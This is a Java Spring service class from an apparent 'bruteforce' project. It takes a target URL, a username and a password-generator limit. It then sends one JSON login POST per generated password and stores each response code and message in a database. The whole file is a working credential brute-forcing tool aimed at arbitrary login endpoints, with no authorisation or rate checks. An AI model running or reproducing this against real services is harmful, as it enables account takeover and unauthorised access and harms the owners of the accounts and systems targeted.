package com.example.bruteforce.Service;

import com.example.bruteforce.Entity.Request;
import com.example.bruteforce.PasswordGenerator.PasswordGenerator;
import com.example.bruteforce.Repo.RequestRepo;
import com.example.bruteforce.Response.HttpResponse;
import org.springframework.stereotype.Service;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;

@Service
public class RequestService {

    private RequestRepo requestRepo;

    public RequestService(RequestRepo requestRepo) {
        this.requestRepo = requestRepo;
    }

    public void sendRequest(String requestUrL, String username, int limit) throws IOException {
        PasswordGenerator passwordGenerator = new PasswordGenerator();
        List<String> password = passwordGenerator.generatePassword(limit);

        for(int i = 0; i<password.size(); i++) {
            URL url = new URL(requestUrL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            String requestBody = "{\"username\":\"" + username + "\",\"password\":\"" + password.get(i) + "\"}";

            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = requestBody.getBytes("utf-8");
                os.write(input, 0, input.length);

                int responseCode = connection.getResponseCode();
                String responseMessage = connection.getResponseMessage();

                Request request = new Request(responseCode, responseMessage, requestBody.replace("\"", "").replace("{","").replace("}",""), requestUrL);
                requestRepo.save(request);
            } finally {
                connection.disconnect();
            }
        }
        password.clear();
    }
}
